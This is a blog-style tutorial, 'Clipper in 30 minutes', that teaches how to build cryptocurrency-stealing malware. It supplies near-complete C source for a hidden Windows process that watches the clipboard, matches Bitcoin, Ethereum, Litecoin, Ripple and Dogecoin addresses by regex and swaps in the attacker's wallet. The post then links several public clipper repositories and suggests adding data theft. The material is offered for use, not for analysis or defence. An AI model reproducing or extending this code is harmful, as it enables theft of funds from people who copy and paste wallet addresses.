---
layout: post
title: "CLIPPER IN 30 MINUTES"
date: 2023-03-10T03:22:42Z
authors: ["Sage Kirk", "Mike Vance"]
categories: ["Development"]
description: "I won't say the product is good or bad as I haven't used it and can't claim anything. And now I will show that the task of writing your own clipper is not so difficult and many people can do it, especially those who have dealt with copy-pasted source codes in the public domain."
thumbnail: "/assets/images/blog/python-.jpg"
image: "/assets/images/blog/python-.jpg"
comments: false
---

# CLIPPER IN 30 MINUTES

I won't say the product is good or bad as I haven't used it and can't claim anything. And now I will show that the task of writing your own clipper is not so difficult and many people can do it, especially those who have dealt with copy-pasted source codes in the public domain.

## How the clipper works

Let's figure out what a clipper is. Clipper is a malicious program that replaces the crypto addresses in the clipboard with the attacker's addresses so that the victim sends them to the attacker while sending coins.
According to this description, we throw in a scheme of work:

Looks simple enough. Let's break down each block.
Obtaining and replacing the clipboard can be implemented through any library that works with winapi in any language.

**How to check if a text is an address? The answer is regular expressions (regex). What's this?**

Regular expressions - used in computer programs that work with text, a formal language for searching and manipulating substrings based on the use of metacharacters ( wildcard in text , . characters) To search, a pattern string is used ( English pattern, in Russian it is often called a "template", "mask"), consisting of characters and metacharacters and setting the search rule. For manipulations with text, a replacement string is additionally specified, which can also contain special characters.
For dummies, regular expressions are a formal language, thanks to which you can check if the text matches certain criteria - length, set of letters, and so on.
You can read more about them here . Checking for compliance occurs according to patterns (English pattern, we usually use the term "template"). Patterns can be easily found on the Internet by query "*crypt* address regex".
Now I will show with my example that writing your own clipper is much easier than you think.

## Clipper writing

I will write in C, it can be written even in python, but it is not recommended.
We create a project in Visual Studio, we create the main file in it, I called it main.c.

Since there is no regex library in the C standard library, I will use the impossibly crude but single and compact library tiny-regex-c . Download re.c and re.h, import them into the project.

We import the necessary libraries into main.c and hide the console through keywords for the compiler: 
```c
#include "re.h"
#include <windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
```
We write functions for getting and replacing the clipboard: 
```python
char* getclipboard()
{
    static HANDLE clip;
    if (OpenClipboard(NULL))
    {
        clip = GetClipboardData(CF_TEXT);
        CloseClipboard();
    }
    return (char*)clip;
}

void setclipboard(char* text)
{
    HGLOBAL global = GlobalAlloc(GMEM_FIXED, strlen(text) + 1);
    memcpy(global, text, strlen(text));
    if (OpenClipboard(NULL))
    {
        EmptyClipboard();
        SetClipboardData(CF_TEXT, global);
        CloseClipboard();
    }
}
```
We create a structure for wallets, it will allow you to easily add new wallets to the clipper (and with the help of regular expressions, you can add at least a substitution of payment links).
```python
typedef struct crypto {
    char* ptn;
    char* address;
}; 
```
We create variables in it with our wallets:
```python
const char* btcadr = "";
const char* segwitadr = "";
const char* ethadr = "";
const char* ltcadr = "";
const char* xrpadr = "";
const char* dogeadr = "";
```
We create structures for wallets and combine them into one list. The ptn variable is the regex pattern, the address variable is the address that will be substituted.

I will have 5 cryptocurrencies - Bitcoin (+SegWit addresses (bc1q)), Ethereum, Litecoin, Ripple, Dogecoin. 
```c
struct crypto btc = { .ptn = "^[13][a-km-zA-HJ-NP-Z1-9]*$", .address = btcadr };  // fixed length is not supported in tiny regex

struct crypto segwit = { .ptn = "^bc1q[a-zA-HJ-NP-Z0-9]*$", .address = segwitadr };  // p2pkh and p2wpkh have different regular expressions, since changing the legacy address to segwit (bc1q) will be noticeable

struct crypto eth = { .ptn = "^0x[a-fA-F0-9]*$", .address = ethadr };

struct crypto ltc = { .ptn = "^[LM3][a-km-zA-HJ-NP-Z1-9]*$", .address = ltcadr };

struct crypto xrp = { .ptn = "^r[0-9a-zA-Z]*$", .address = xrpadr };

struct crypto doge = { .ptn = "^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]*$", .address = dogeadr };

struct crypto all[6] = { btc, segwit, eth, ltc, xrp, doge };  // where 6 is the number of services
```
Regular expressions have a non-fixed (*) number of repetitions. This is not so safe, since, say, the text 1abc will match the regular expression and will be replaced. It is used due to the fact that tiny-regex-c cannot be set to a fixed number of repetitions, in all languages ​​where it is supported, I urge you to set a fixed number of repetitions corresponding to the type of address.
Main Loop:
```js
while (1) {
         char*clipdata = getclipboard();  // get clipboard
         if (clipdata != NULL) { // if there is something in the buffer
             for (int i = 0; i < 6; i++) { // loop from all types of wallets, where 6 is the number of services
                 int matchlen;
                 int match = re_match(all[i].ptn, clipdata, &matchlen);  // check if the text in the buffer is the corresponding address
                 if (match != -1) { // if it is, change the clipboard to the address specified in the code
                     setclipboard(all[i].address);
                 }
             }
         }
         Sleep(50);  // so that the percent does not load, after each check, sleep for 0.05 seconds
     }
```
In the comments, I wrote down what each team is responsible for.

> It took me ～half an hour to write this clipper. Only 65 lines, the final stub weighs 12.5kb.
You can add substitution of other addresses on a regular basis in the same way as wallets are added above. Sending information about a PC and other garbage can be soldered by anyone, with Google.

## Sources :

**C Clipper** : [link](https://github.com/ratabomb/fuckclipper)
**C++ Clipper** : [link](https://github.com/sorosgamble/CoinClipper)
**Py Clipper** : [link](https://github.com/NightfallGT/BTC-Clipper)
**C# Clipper** : [link](https://github.com/SmokingWalrus/BTC-Clipper)
**PureBasic Clipper** : [link](https://github.com/fakkura/Clipper)
